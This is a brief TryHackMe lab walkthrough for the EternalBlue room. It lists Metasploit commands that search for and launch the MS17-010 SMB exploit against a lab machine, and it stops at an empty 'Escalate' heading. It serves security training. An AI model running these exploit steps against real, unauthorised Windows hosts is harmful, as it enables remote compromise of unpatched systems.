# Eternal Blue Room - TryHackMe

## Task 2 - Gain Access

- Initiate metasploit -> `msfconsole`

- Search for vulnerability -> `search ms17-010`
- Solution -> `exploit/windows/smb/ms17_010_eternalblue`

- Select the exploit that we discover before -> use exploit/xxx
- Run the command -> `show options`
- Solution -> Missing required param `RHOSTS`
- Set the variable -> `set RHOSTS $MACHINE_IP`

- Run the `exploit`

## Task 3 - Escalate
